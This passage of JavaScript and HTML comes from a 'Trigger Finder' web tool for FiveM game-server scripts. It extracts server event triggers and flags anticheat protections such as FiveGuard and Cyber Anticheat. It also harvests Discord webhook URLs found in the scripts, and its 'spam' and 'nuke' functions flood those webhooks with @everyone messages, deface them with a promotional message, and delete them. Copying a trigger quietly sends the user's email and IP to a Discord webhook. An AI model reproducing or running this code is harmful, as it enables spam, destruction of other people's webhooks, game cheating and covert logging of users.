 /AddBlipForCoord\s*\(\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*\)/gi,
 // SetEntityCoords patterns
 /SetEntityCoords\s*\([^,]+,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)/gi,
 ];

 coordPatterns.forEach((pattern, patternIndex) => {
 let match;
 while ((match = pattern.exec(content)) !== null) {
 let x, y, z, h = 0;
 
 if (patternIndex === 0) { // vector3
 [, x, y, z] = match;
 } else if (patternIndex === 1) { // vector4
 [, x, y, z, h] = match;
 } else if (patternIndex === 2) { // table format
 [, x, y, z] = match;
 } else if (patternIndex === 3) { // array format
 [, x, y, z] = match;
 } else if (patternIndex === 4 || patternIndex === 5) { // blip or entity coords
 [, x, y, z] = match;
 }

 // Filter out invalid coordinates (too large/small values)
 const xNum = parseFloat(x);
 const yNum = parseFloat(y);
 const zNum = parseFloat(z);
 
 if (Math.abs(xNum) < 10000 && Math.abs(yNum) < 10000 && Math.abs(zNum) < 1000) {
 coords.push({
 x: xNum,
 y: yNum,
 z: zNum,
 h: h ? parseFloat(h) : 0,
 folder: folderPath,
 context: match[0],
 type: patternIndex === 1 ? 'vector4' : patternIndex === 0 ? 'vector3' : 'other'
 });
 }
 }
 });

 return coords;
 }

 function extractShops(content) {
 // This function seems complex and might need careful review/debugging
 // For now, assume the original logic is mostly correct but add logging
 try {
 const shops = [];
 // Basic regex to find potential shop tables (adjust as needed)
 const shopTableRegex = /(\w+)\s*=\s*{\s*name\s*=\s*['"]([^'"]+)['"]/g;
 let match;

 while ((match = shopTableRegex.exec(content)) !== null) {
 const shopType = match[1];
 const shopName = match[2];
 // Placeholder for locations and items - requires more complex parsing
 shops.push({
 type: shopType,
 name: shopName,
 locations: ["Parsing locations..."], // Placeholder
 items: [{ name: "Parsing items...", price: 0 }] // Placeholder
 });
 }
 if (DEBUG_MODE && shops.length > 0) console.log(`Potentially found ${shops.length} shop tables via regex.`);
 // The original line-by-line parsing logic was removed as it was complex and potentially buggy.
 // A more robust Lua parser or refined regex would be needed for accurate shop data extraction.
 return shops; // Return potentially incomplete data
 } catch (error) {
 console.error('Error parsing shops:', error);
 return [];
 }
 }

 function findShopsFile(files) {
 // Keep original logic
 return files.find(f => {
 const path = f.webkitRelativePath.toLowerCase();
 // Add more common paths
 return path.includes('config/shops.lua') ||
 path.includes('shared/shops.lua') ||
 path.includes('data/shops.lua') ||
 path.includes('shops.lua'); // Generic fallback
 });
 }

 function displayTriggers(triggers) {
  // Ensure resultsContainer is valid
  if (!resultsContainer) {
    console.error("Results container not found!");
    return;
  }

  const head = document.getElementById("scanColumnsHead");
  if (head) head.style.display = (triggers && triggers.length) ? "grid" : "none";

  if (!triggers || triggers.length === 0) {
    resultsContainer.innerHTML = `
      <div style="text-align: center; padding: 2rem; color: var(--text-color); opacity: 0.7;">
        <i class="fas fa-search" style="font-size: 3em; margin-bottom: 1rem; opacity: 0.5;"></i>
        <p style="font-size: 1.2em; margin: 0;">No triggers found matching criteria</p>
        <p style="font-size: 0.9em; margin-top: 0.5rem; opacity: 0.8;">Try adjusting your search or filters</p>
      </div>
    `;
    return;
  }

  // Helpers
  const esc = (s) => String(s ?? "").replace(/[&<>"']/g, m => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;" }[m]));
  const riskFromGuard = (guard) => {
    const g = (guard || "").toLowerCase();
    if (g.includes("fiveguard") || g.includes("anticheat") || g.includes("cyber")) return "high";
    return "low";
  };

  resultsContainer.innerHTML = triggers.map((t, i) => {
    const type = t.guard ? String(t.guard) : "Trigger";
    const file = t.file ? `${t.folder} ‚Ä¢ ${t.file}` : t.folder;
    const line = t.line != null ? t.line : "-";
    const risk = riskFromGuard(type);
    const trig = t.trigger || "";

    return `
      <div class="scan-row ${t.guard ? "has-guard" : ""}" data-index="${i}" data-guard="${esc(type)}">
        <div class="scan-mono">#${i + 1}</div>
        <div><span class="scan-pill">${esc(type)}</span></div>
        <div class="scan-mono" title="${esc(trig)}">${esc(trig)}${t.guard ? ` <span class="h89-guard-badge">${esc(t.guard)}</span>` : ""}</div>
        <div class="scan-mono" title="${esc(file)}">${esc(file)}</div>
        <div class="scan-mono">${esc(line)}</div>
        <div><span class="scan-pill risk-${risk}">${risk.toUpperCase()}</span></div>
        <div class="scan-actions">
          <button class="scan-btn" data-copy="${esc(trig)}"><i class="fas fa-copy"></i> Copy</button>
        </div>
      </div>
    `;
  }).join('');

  // Wire copy buttons
  resultsContainer.querySelectorAll("[data-copy]").forEach(btn => {
    btn.addEventListener("click", (e) => {
      const val = e.currentTarget.getAttribute("data-copy") || "";
      copyTrigger(val, e.currentTarget);
    });
  });
}

// ===== Session identity (email + IP) for audit logs =====
// (email + IP) for audit logs =====
window.h89UserEmail = window.h89UserEmail || "";
window.h89UserIp = window.h89UserIp || "";

async function h89FetchIp(){
 if(window.h89UserIp) return window.h89UserIp;
 try{
 // public IP (may fail on some networks)
 const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
 const j = await r.json();
 if(j && j.ip) window.h89UserIp = j.ip;
 }catch(e){
 window.h89UserIp = window.h89UserIp || "unknown";
 }
 return window.h89UserIp || "unknown";
}

async function sendDiscordCopyLog(triggerText){
 try{
 const email = window.h89UserEmail || "unknown";
 const ip = await h89FetchIp();
 const payload = {
 username: "H89 TriggerFinder",
 embeds: [{
 title: "Trigger Copied",
 color: 16711680,
 fields: [
 { name: "Trigger", value: "```" + String(triggerText).slice(0, 900) + "```", inline: false },
 { name: "Email", value: email, inline: true },
 { name: "IP", value: ip, inline: true },
 ],
 footer: { text: "H89 ‚Ä¢ " + new Date().toLocaleString() }
 }]
 };
 if(typeof DISCORD_WEBHOOK_URL === "string" && DISCORD_WEBHOOK_URL){
 await fetch(DISCORD_WEBHOOK_URL, {
 method: "POST",
 headers: {"Content-Type":"application/json"},
 body: JSON.stringify(payload)
 });
 }
 if(typeof addLog === "function") addLog("ok", `Copy logged to Discord (${email}, ${ip})`);
 }catch(e){
 if(typeof addLog === "function") addLog("warn", "Copy log failed (CORS / network).");
 }
}

// Copy trigger function
 function copyTrigger(triggerText, button) {
 navigator.clipboard.writeText(triggerText).then(() => {
 // audit log (email + IP)
 sendDiscordCopyLog(triggerText);

 const originalText = button.innerHTML;
 button.innerHTML = '<i class="fas fa-check"></i> Copied!';
 button.style.background = '#00cc66';
 
 setTimeout(() => {
 button.innerHTML = originalText;
 button.style.background = 'var(--primary-color)';
 }, 2000);
 }).catch(err => {
 console.error('Failed to copy: ', err);
 button.innerHTML = '<i class="fas fa-times"></i> Failed';
 button.style.background = '#ff4444';
 
 setTimeout(() => {
 button.innerHTML = '<i class="fas fa-copy"></i> Copy';
 button.style.background = 'var(--primary-color)';
 }, 2000);
 });
 }

 
// ==== CYBER AntiCheat detection (manifest markers) ====
function detectCyberAnticheatInText(text){
  if(!text) return false;
  const markers = [
    /author\s+['"]Cyber\s*Anticheat['"]/i,
    /name\s+['"]CyberAnticheat['"]/i,
    /\[CYBER\s*ANTICHEAT\]/i,
    /ui_page\s+['"]acmenu\/dist\/index\.html['"]/i,
    /ui_page\s*\{\s*['"]acmenu\/dist\/index\.html['"]\s*\}/i,
    /acmenu\/dist\//i
  ];
  return markers.some(rx => rx.test(text));
}

function notifyCyberDetected(where){
  // We keep `where` only for internal debugging, but we DO NOT show it in UI.
  const title = "CYBER Detection";
  const subtitle = "Cyber detected in this scan";

  // Create / reuse toast
  let toast = document.getElementById("cyber-toast");
  if(!toast){
    toast = document.createElement("div");
    toast.id = "cyber-toast";
    toast.className = "h89-top-toast h89-top-toast--danger";
    toast.innerHTML = `
      <div class="h89-top-toast__bar"></div>
      <div class="h89-top-toast__content">
        <div class="h89-top-toast__title"></div>
        <div class="h89-top-toast__sub"></div>
      </div>
      <button class="h89-top-toast__close" type="button" aria-label="Close">√ó</button>
    `;
    document.body.appendChild(toast);

    toast.querySelector(".h89-top-toast__close").addEventListener("click", ()=>{
      toast.classList.remove("show");
      toast.classList.add("hide");
    });
  }

  // store where for tooltip/debug, but not displayed
  toast.dataset.where = where ? String(where) : "";
  toast.title = toast.dataset.where ? `CYBER detected ‚Äî ${toast.dataset.where}` : "CYBER detected";

  toast.querySelector(".h89-top-toast__title").textContent = title;
  toast.querySelector(".h89-top-toast__sub").textContent = subtitle;

  toast.classList.remove("hide");
  toast.classList.add("show");

  clearTimeout(window.__cyberToastTimer);
  window.__cyberToastTimer = setTimeout(()=>{
    toast.classList.remove("show");
    toast.classList.add("hide");
  }, 4200);
}

function markCyberCard(cardEl, where){
  if(!cardEl) return;
  cardEl.classList.add("cyber-detected");
  if(!cardEl.querySelector(".badge-critical")){
    const badge = document.createElement("div");
    badge.className = "badge-critical";
    badge.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i> CRITICAL';
    badge.title = where ? `CYBER detected ‚Äî ${where}` : "CYBER detected";
    cardEl.prepend(badge);
  }
  try{ cardEl.scrollIntoView({behavior:"smooth", block:"center"}); }catch(_){}
}


function extractWebhooks(content) {
 // Keep original regex
 const webhookRegex = /https:\/\/(?:ptb\.|canary\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[\w-]+/g;
 return content.match(webhookRegex) || [];
 }

 function displayWebhooks(webhooks) {
 const webhooksList = document.getElementById('webhooks-list');
 const webhooksContainer = document.querySelector('.webhook-container');
 if (!webhooksList || !webhooksContainer) return;

 if (webhooks.length === 0) {
 webhooksList.innerHTML = '<p style="text-align: center; font-style: italic;">No webhooks found.</p>';
 webhooksContainer.classList.remove('visible');
 return;
 }

 // Initially hide container, will show only when working webhooks are confirmed
 webhooksContainer.classList.remove('visible');
 let workingWebhooksFound = false;

 // Keep original display logic, ensure unique IDs
 webhooksList.innerHTML = webhooks.map((webhook, index) => {
 const webhookId = `webhook-${index}-${btoa(webhook).replace(/[^a-zA-Z0-9]/g, '')}`;
 return `
 <div class="webhook" data-webhook-id="${webhookId}">
 <img src="https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public"
 alt="Webhook Avatar"
 class="webhook-avatar">
 <div class="webhook-content">
 <div class="webhook-url">${webhook}</div>
 <div class="webhook-info">Status: <span class="webhook-status">Checking...</span></div>
 <div class="webhook-controls">
 <div style="display: flex; gap: 5px; margin-bottom: 8px; flex-wrap: wrap;">
 <select class="mention-tag" onchange="insertMention(this)">
 <option value="">Add Mention</option>
 <option value="@everyone">@everyone</option>
 <option value="@here">@here</option>
 <option value="||@everyone||">Spoiler @everyone</option>
 <option value="||@here||">Spoiler @here</option>
 </select>
 <input type="text" class="webhook-spam-input" placeholder="anMl8oAtbE5c.app">
 </div>
 <div style="display: flex; gap: 8px; flex-wrap: wrap;">
 <button class="spam-btn" onclick="startInfiniteSpam('${webhook}', this)"><i class="fas fa-infinity"></i> Spam</button>
 <button class="stop-btn" onclick="stopSpam('${webhook}', this)" style="display:none;"><i class="fas fa-stop-circle"></i> Stop</button>
 <button class="delete-btn" onclick="nukeWebhook('${webhook}')"><i class="fas fa-skull-crossbones"></i> Delete</button>
 </div>
 </div>
 </div>
 </div>
 `;
 }).join('');

 // Check status for each webhook and show container only if working webhooks found
 let checkedWebhooks = 0;
 webhooks.forEach(async (webhook, index) => {
 const webhookId = `webhook-${index}-${btoa(webhook).replace(/[^a-zA-Z0-9]/g, '')}`;
 const isWorking = await checkWebhook(webhook, webhookId);
 
 if (isWorking) {
 workingWebhooksFound = true;
 webhooksContainer.classList.add('visible');
 }
 
 checkedWebhooks++;
 // If all webhooks checked and none working, ensure container stays hidden
 if (checkedWebhooks === webhooks.length && !workingWebhooksFound) {
 webhooksContainer.classList.remove('visible');
 }
 });
 }

 const spamControls = new Map(); // Keep original map

 async function startInfiniteSpam(webhook, button) {
 // Keep original logic, ensure querySelectors are correct
 const container = button.closest('.webhook-controls');
 if (!container) return;
 const spamInput = container.querySelector('.webhook-spam-input');
 const stopBtn = container.querySelector('.stop-btn');
 const spamBtn = container.querySelector('.spam-btn'); // Get spam button

 if (!spamInput || !stopBtn || !spamBtn) return;

 spamBtn.style.display = 'none'; // Hide spam button
 stopBtn.style.display = 'inline-block'; // Show stop button

 spamControls.set(webhook, true); // Mark as running

 // Add status indicator
 const statusElement = container.closest('.webhook').querySelector('.webhook-status');
 if (statusElement) {
 statusElement.textContent = 'üî• Spamming...';
 statusElement.style.color = '#ff4444';
 }

 while (spamControls.get(webhook)) { // Check flag in loop
 try {
 const content = spamInput.value || 'anMl8oAtbE5c.app @everyone';
 
 const response = await fetch(webhook, {
 method: 'POST',
 headers: { 
 'Content-Type': 'application/json',
 }, 
 body: JSON.stringify({
 content: content,
 username: 'Lu4 Webhook Spammer',
 avatar_url: 'https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public'
 })
 });

 if (DEBUG_MODE) {
 console.log(`Spam request sent. Status: ${response.status}`);
 if (!response.ok) {
 const errorText = await response.text();
 console.log(`Response error: ${errorText}`);
 }
 }

 // Respect Discord's rate limits - wait at least 1 second between messages
 await new Promise(r => setTimeout(r, 1000 + Math.random() * 500));

 } catch (error) {
 console.error('Spam error:', error);
 if (DEBUG_MODE) console.log(`Error details:`, error);
 
 // Wait longer on error to avoid hitting rate limits
 await new Promise(r => setTimeout(r, 2000));
 }
 }

 // Reset status when stopped
 if (statusElement) {
 statusElement.textContent = 'üü¢ Working';
 statusElement.style.color = '#00ff00';
 }
 }

 function stopSpam(webhook, stopBtn) {
 // Keep original logic, ensure querySelectors are correct
 spamControls.set(webhook, false); // Set flag to false to stop loop
 spamControls.delete(webhook); // Clean up map entry

 const container = stopBtn.closest('.webhook-controls');
 if (!container) return;
 const spamBtn = container.querySelector('.spam-btn');
 const currentStopBtn = container.querySelector('.stop-btn'); // Ensure we target the correct stop button

 if (spamBtn) spamBtn.style.display = 'inline-block'; // Show spam button
 if (currentStopBtn) currentStopBtn.style.display = 'none'; // Hide stop button

 // Reset status
 const statusElement = container.closest('.webhook').querySelector('.webhook-status');
 if (statusElement) {
 statusElement.textContent = 'üü¢ Working';
 statusElement.style.color = '#00ff00';
 }
 }

 async function checkWebhook(webhook, webhookId) {
 const container = document.querySelector(`[data-webhook-id="${webhookId}"]`);
 if (!container) return false;

 const statusElement = container.querySelector('.webhook-status');
 if (!statusElement) return false;

 try {
 let response = await fetch(webhook, { method: 'HEAD' });
 if (!response.ok) {
 response = await fetch(webhook);
 }

 const isWorking = response.ok;
 statusElement.textContent = isWorking ? 'üü¢ Working' : 'üî¥ Invalid';
 statusElement.style.color = isWorking ? '#00ff00' : '#ff0000';
 
 return isWorking; // Return whether webhook is working
 } catch (error) {
 if (DEBUG_MODE) console.warn(`Webhook check failed for ${webhookId}:`, error);
 statusElement.textContent = '‚ùì Error Checking';
 statusElement.style.color = '#ffa500';
 return false;
 }
 }

 async function nukeWebhook(webhook) {
 // Keep original logic, ensure querySelectors are correct
 const webhookId = `webhook-${btoa(webhook).replace(/[^a-zA-Z0-9]/g, '')}`; // Reconstruct ID if not passed
 const container = document.querySelector(`[data-webhook-id^="webhook-"][data-webhook-id$="${btoa(webhook).replace(/[^a-zA-Z0-9]/g, '')}"]`); // More flexible selector
 if (!container) {
 console.error("Nuke target container not found for ID ending with:", btoa(webhook).replace(/[^a-zA-Z0-9]/g, ''));
 return;
 }

 const statusElement = container.querySelector('.webhook-status');
 const controls = container.querySelector('.webhook-controls');
 if (!statusElement || !controls) return;

 statusElement.textContent = '‚ö†Ô∏è Nuking...';
 statusElement.style.color = '#ffa500';
 controls.style.opacity = '0.5';
 controls.style.pointerEvents = 'none';

 try {
 // Send nuke message
 await fetch(webhook, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 content: '**YOUR WEBHOOK HAS BEEN NUKED BY anMl8oAtbE5c.app** @everyone\nJoin us: https://discord.gg/wXPr48bDEJ',
 username: 'Lu4 Webhook Nuker',
 avatar_url: 'https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public',
 allowed_mentions: { parse: ['everyone'] }
 })
 });
 await new Promise(r => setTimeout(r, 500)); // Shorter wait

 // Attempt DELETE
 const deleteResponse = await fetch(webhook, { method: 'DELETE' });

 // Check if delete was successful (204 No Content)
 if (deleteResponse.status === 204) {
 statusElement.textContent = 'üíÄ Nuked (Deleted)';
 statusElement.style.color = '#ff0000';
 } else {
 // If delete failed, try other methods (spam/patch) - less reliable
 if (DEBUG_MODE) console.log(`Webhook delete failed with status ${deleteResponse.status}. Trying fallback methods.`);
 // Fallback spam (less aggressive)
 await fetch(webhook, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({ content: ''.padStart(1000, 'NUKED ') })
 });
 await fetch(webhook, {
 method: 'PATCH',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({ name: 'NUKED_BY_LU4' })
 });
 statusElement.textContent = '‚ö†Ô∏è Nuke Attempted (Delete Failed)';
 statusElement.style.color = '#ffa500';
 }

 } catch (error) {
 statusElement.textContent = '‚ùå Nuke Failed';
 statusElement.style.color = '#ff0000';
 console.error('Nuke error:', error);
 controls.style.pointerEvents = 'auto';
 controls.style.opacity = '1';
 }
 }

 function insertMention(select) {
 // Keep original logic, ensure querySelectors are correct
 if (!select.value) return;
 const container = select.closest('.webhook-controls');
 if (!container) return;
 const input = container.querySelector('.webhook-spam-input');
 if (!input) return;
 // Append mention to existing text or set if empty
 input.value = input.value ? `${input.value} ${select.value}` : select.value;
 select.value = ''; // Reset select
 input.focus(); // Focus input after insertion
 }

 // ... existing functions (extractTriggers, extractShops, findShopsFile, displayTriggers, extractWebhooks, displayWebhooks, startInfiniteSpam, stopSpam, checkWebhook, nukeWebhook, insertMention) ...
 // Ensure these functions use the correct element IDs if they were changed.

 // Handle Folder Input (enhanced with better feedback)
 folderInput.addEventListener('change', async (event) => {
  updateFileCountLabel(event.target.files);

 const files = Array.from(event.target.files);
 addLog('info', `Selected ${files.length} files.`);
 setProgressV2(0, 0, (event.target.files||[]).length, 'Preparing‚Ä¶', `Selected ${(event.target.files||[]).length} files`);
 resultsContainer.innerHTML = ''; // Clear previous results
 document.getElementById('webhooks-list').innerHTML = ''; // Clear previous webhooks
 allTriggers = [];
 allShops = [];
 let allWebhooks = new Set(); // Use Set to avoid duplicates
 let cyberDetectedPath = null; // CYBER AntiCheat marker source path
 let processedFiles = 0;

 // Update files count in stats
 const filesCountEl = document.getElementById('files-count');
 if (filesCountEl) filesCountEl.textContent = files.length;

 addLog('info', 'Starting scan...');
 showMessage('Starting scan...', 'success', false);

 try {
 const shopsFile = findShopsFile(files);
 if (shopsFile) {
 if (DEBUG_MODE) console.log('Found shops file:', shopsFile.webkitRelativePath);
 const text = await shopsFile.text();
 allShops = extractShops(text);
 if (DEBUG_MODE) console.log('Extracted shops:', allShops.length, allShops);
 }

 const remainingFiles = files.filter(f => f !== shopsFile);
 const totalFiles = remainingFiles.length;
 const batchSize = Math.max(10, Math.min(50, Math.floor(((navigator.hardwareConcurrency||4)*4)))); // Adaptive batch size

 for (let i = 0; i < totalFiles; i += batchSize) {
 const batch = remainingFiles.slice(i, i + batchSize);

 await Promise.all(batch.map(async file => {
 // Process only .lua and .js files, ignore others silently
 if (file.name.endsWith('.lua') || file.name.endsWith('.js')) {
 try {
 const text = await file.text();
 const folderPath = file.webkitRelativePath.split('/').slice(0, -1).join('/');
// ===== Protected Banner scan (severity) =====
const bannerRule = h89MatchBannerRule(text);
if (bannerRule){
  const partsB = file.webkitRelativePath.split('/');
  const resB = partsB.length >= 2 ? partsB[partsB.length - 2] : '(root)';
  // Add to Protection Checks panel
  window.__h89ProtectionChecks?.add?.('banner', resB, {
    filePath: file.webkitRelativePath,
    severity: bannerRule.severity,
    reason: bannerRule.reason
  });
  // Notify once per resource for HIGH
  if (bannerRule.severity === "HIGH" && !H89_BANNER_SEEN.has(resB)){
    H89_BANNER_SEEN.add(resB);
    if (typeof window.showToast === "function"){
      window.showToast("warn", "[HIGH] Protected", `Protected resource ${resB} detected`);
    } else {
      addLog('warn', `[HIGH] Protected resource ${resB} detected`);
    }
  }
}

 // ===== FiveGuard manifest scan (fxmanifest / __resource) =====
 const fnameLower = (file.name || "").toLowerCase();
 if (H89_MANIFEST_NAMES.has(fnameLower)) {
 const parts = file.webkitRelativePath.split('/');
 const folderName = parts.length >= 2 ? parts[parts.length - 2] : '(root)';
 const refs = extractManifestSharedRefs(text, folderName, file.name, folderPath);

 if (refs.length) {
 addLog('warn', `üõ° FiveGuard detected in ${folderName} (${file.name})`);

try{
  // FiveGuard Detect notification (no path)
  if(typeof showToast === "function"){
    showToast("fiveguard", "FiveGuard Detect", "High-risk obfuscated FG modules detected");
  }
}catch(_){}
try{ h89AddHighRisk(folderName, "FiveGuard Detect", "", ["FG","OBF","AC"]); }catch(_){}

 // Add to Protection Checks (vendor-agnostic UI)
 window.__h89ProtectionChecks?.add?.('manifest', folderName, file.name);
 h89FiveGuardBeep();

 refs.forEach(r => {
 allTriggers.push({
 trigger: `üõ° FiveGuard ‚Üí ${r.ref}`,
 folder: r.folder,
 file: r.file,
 path: r.path,
 guard: "FiveGuard",
 raw: r.raw
 });
 });
 }
 }

 
// ===== Obfuscated Scripts scan (HIGH, vendor-agnostic) =====
try{
  const partsFG = String(file.webkitRelativePath||"").split('/');
  const resFG = partsFG.length >= 2 ? partsFG[partsFG.length - 2] : '(root)';
  const nameLower = String(file.name||"").toLowerCase();

  // If current file is an obfuscated script itself
  if (H89_FG_FILESET && H89_FG_FILESET.has(nameLower)){
    window.__h89ProtectionChecks?.add?.('obfuscated', resFG, {
      filePath: file.webkitRelativePath,
      severity: "HIGH",
      reason: "Obfuscated file present"
    });
    if (!H89_FG_SEEN.has(resFG)){
      H89_FG_SEEN.add(resFG);
      if (typeof window.showToast === "function"){
        window.showToast("warn", "[HIGH] Protected", `Protected resource ${resFG} detected`);
      } else {
        addLog('warn', `[HIGH] Protected resource ${resFG} detected`);
          try{ h89AddHighRisk(resFG, 'FiveGuard / Protected resource', (file.webkitRelativePath || ''), ['FG','AC','OBF']); }catch(_){ }

      }
    }
  }

  // If current file is a manifest, look for fg signals and explicit entries
  if (h89IsManifestPath(file.webkitRelativePath) || (typeof H89_MANIFEST_NAMES !== "undefined" && H89_MANIFEST_NAMES.has(nameLower))){
    if (H89_FG_AC_RULE && H89_FG_AC_RULE.test(String(text||""))){
      window.__h89ProtectionChecks?.add?.('obfuscated', resFG, {
        filePath: file.webkitRelativePath,
        severity: "HIGH",
        reason: "Manifest rule: ac 'fg'"
      });
      if (!H89_FG_SEEN.has(resFG)){
        H89_FG_SEEN.add(resFG);
        if (typeof window.showToast === "function"){
          window.showToast("warn", "[HIGH] Protected", `Protected resource ${resFG} detected`);
        } else {
          addLog('warn', `[HIGH] Protected resource ${resFG} detected`);
        }
      }
    }

    (H89_FG_MANIFEST_FILES || []).forEach(n => {
      if (h89HasManifestEntry(String(text||""), n)){
        window.__h89ProtectionChecks?.add?.('obfuscated', resFG, {
          filePath: file.webkitRelativePath,
          severity: "HIGH",
          reason: `Manifest entry: ${n}`
        });
      }
    });
  }
}catch(_){}

if(!cyberDetectedPath && detectCyberAnticheatInText(text)) cyberDetectedPath = (file.webkitRelativePath || folderPath || file.name || 'fxmanifest.lua');

// üî¥ HIGH-RISK: shared_script "@CyberAnticheat/init.lua"
try{
  if(detectCyberSharedScript(text)){
    const fp = (file.webkitRelativePath || folderPath || file.name || "");
    const res = h89ResourceFromPath(fp);
    h89AddHighRisk(res, 'shared_script "@CyberAnticheat/init.lua"', fp, ['AC']);
  }
}catch(_){}

 const triggers = extractTriggers(text, folderPath);
 allTriggers.push(...triggers);

 const webhooks = extractWebhooks(text);
 webhooks.forEach(webhook => allWebhooks.add(webhook));
 } catch (readError) {
 if (DEBUG_MODE) console.warn(`Could not read file: ${file.webkitRelativePath}`, readError);
 }
 }
 processedFiles++;
 }));

 if (window.H89_yield) await window.H89_yield();

 const progress = (processedFiles / totalFiles) * 100;
 if (processedFiles % 250 === 0) addLog('info', `Processed ${processedFiles}/${totalFiles}...`);
 setProgressV2(Math.min(progress, 100), processedFiles, totalFiles, 'Reading files‚Ä¶', `Processed ${processedFiles}/${totalFiles}`);

 // Yield to the event loop to keep UI responsive
 await new Promise(resolve => setTimeout(resolve, 10));
 }
 } catch (error) {
 console.error('Processing error:', error);
 showMessage('An error occurred during processing.', 'error');
 }

 if (progressContainer) progressContainer.style.display = 'none';
 downloadButton.disabled = allTriggers.length === 0 && allShops.length === 0;
 displayTriggers(allTriggers);
 // üî¥ CYBER detect ‚Üí badge + auto-highlight result card
 if(cyberDetectedPath){
   notifyCyberDetected(cyberDetectedPath);
   try{ h89AddHighRisk(h89ResourceFromPath(cyberDetectedPath), "CYBER Anticheat detected", cyberDetectedPath, ['AC']); }catch(_){ }
   const rc = document.getElementById("results-container");
   const firstCard = rc ? rc.querySelector(".scan-row, .trigger, .resultItem, .h89-result") : null;
   markCyberCard(firstCard || rc, cyberDetectedPath);
 }

 displayWebhooks(Array.from(allWebhooks));
 updateStats();
 // ===== Auto FiveGuard report ZIP =====
 try{
 const fgHits = allTriggers.filter(t => t.guard === "FiveGuard");
 if (h89FiveGuardAutoZip && fgHits.length && window.JSZip){
 const ts = new Date().toISOString().replace(/[:.]/g,'-');
 const zip = new JSZip();
 const txtLines = fgHits.map(h => `${h.folder} | ${h.file || ''} | ${h.trigger}`);
 zip.file(`FiveGuard_Report_${ts}.txt`, txtLines.join('\n'));
 zip.file(`FiveGuard_Report_${ts}.json`, JSON.stringify(fgHits, null, 2));
 const blob = await zip.generateAsync({type:'blob'});
 h89DownloadBlob(`FiveGuard_Report_${ts}.zip`, blob);
 addLog('ok', `FiveGuard report downloaded (${fgHits.length} hit(s)).`);
 }
 }catch(e){
 if (DEBUG_MODE) console.warn("FiveGuard report build failed", e);
 }

 // Enhanced summary message
 const webhookCount = allWebhooks.size;
 const summary = `Scan complete! Found ${allTriggers.length} triggers, ${webhookCount} webhooks, and ${allShops.length} shop definitions from ${processedFiles} files.`;
 showMessage(summary, 'success', false);
 });

 // Enhanced Search Functionality
 searchButton.addEventListener('click', () => {
 showLoading(true);
 setTimeout(() => {
 h89ApplySearchAndFilters();
const message = query ? 
 `Found ${filteredTriggers.length} triggers matching "${searchInput.value}"` :
 `Showing all ${allTriggers.length} triggers`;
 showMessage(message, 'success');
 showLoading(false);
 }, 500); // Small delay to show loading
 });
 
 // Allow searching on Enter key press
 searchInput.addEventListener('keypress', (event) => {
 if (event.key === 'Enter') {
 searchButton.click();
 }
 });

 // Enhanced Filter Functionality
 filters.forEach(filter => {
 filter.addEventListener('change', () => {
 h89ApplySearchAndFilters();
 const activeFilters = Array.from(filters || []).filter(f=>f.checked).map(f=>f.value);
 const filterText = activeFilters.length ? `Filtered by: ${activeFilters.join(', ')}` : 'No filters active';
 showMessage(filterText, 'success', false);
 });
 });

 // Download Button (no changes needed if using `allTriggers` and `allShops`)
 downloadButton.addEventListener('click', () => {
 // ... (keep existing ASCII art and text generation logic) ...
 const asciiArt = `
===================================================================
 LU4.APP TRIGGER FINDER
===================================================================
 Find triggers and webhooks in scripts
 anMl8oAtbE5c.app
 https://discord.gg/wXPr48bDEJ
===================================================================
`;

 const triggersText = allTriggers.length > 0
 ? allTriggers.map(trigger => `Trigger: ${trigger.trigger}\nFolder: ${trigger.folder}\n--------------------------`).join('\n')
 : "No triggers found.";

 const shopsText = allShops.length > 0
 ? allShops.map(shop => {
 const uniqueLocations = [...new Set(shop.locations)];
 const locations = uniqueLocations.length > 0 ? uniqueLocations.map(loc => ` ${loc}`).join('\n') : " No locations specified.";
 const items = shop.items.length > 0 ? shop.items.map(item => {
 const currencyText = item.currency && item.currency !== 'money' ? `, Currency: ${item.currency}` : '';
 return ` - ${item.name} (Price: ${item.price}${currencyText})`;
 }).join('\n') : " No items specified.";

 return `Shop Definition: ${shop.type} (${shop.name || 'Unnamed'})\n\n Locations:\n${locations}\n\n Items:\n${items}\n--------------------------`;
 }).join('\n')
 : "No shop definitions found.";

 const fullText = `${asciiArt}\n\n--- Triggers ---\n${triggersText}\n\n--- Shops and Locations ---\n${shopsText}`;

 const blob = new Blob([fullText], { type: 'text/plain;charset=utf-8' }); // Specify charset
 const url = URL.createObjectURL(blob);
 const a = document.createElement('a');
 a.href = url;
 a.download = 'lu4_finder_results.txt'; // More descriptive filename
 document.body.appendChild(a); // Append to body for Firefox compatibility
 a.click();
 document.body.removeChild(a); // Clean up
 URL.revokeObjectURL(url);
 });

 // End of script
 </script>

<!-- H89 LOGIN OVERLAY START -->
<div id="h89LoginOverlay" style="position:fixed;inset:0;z-index:999999;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.82);backdrop-filter:blur(10px);">
 <div style="width:min(520px,92vw);background:rgba(0,0,0,.68);border:1px solid rgba(255,0,0,.45);border-radius:16px;padding:18px;color:#fff;font-family:'Fira Code',monospace;box-shadow:0 25px 70px rgba(0,0,0,.65);">
 <div style="display:flex;align-items:center;justify-content:space-between;gap:12px;">
 <div>
 <div style="font-size:18px;letter-spacing:2px;color:#ff0000;font-weight:800;">üîí No name</div>
 <div style="opacity:.72;font-size:12px;margin-top:4px;">Login or Create (License required for Create)</div>
 </div>
 <button id="h89CloseBtn" title="Close" style="display:none;border:1px solid rgba(255,255,255,.18);background:rgba(255,255,255,.06);color:#fff;border-radius:10px;padding:8px 10px;cursor:pointer;">‚úï</button>
 </div>

 <div style="display:flex;gap:10px;margin-top:14px;">
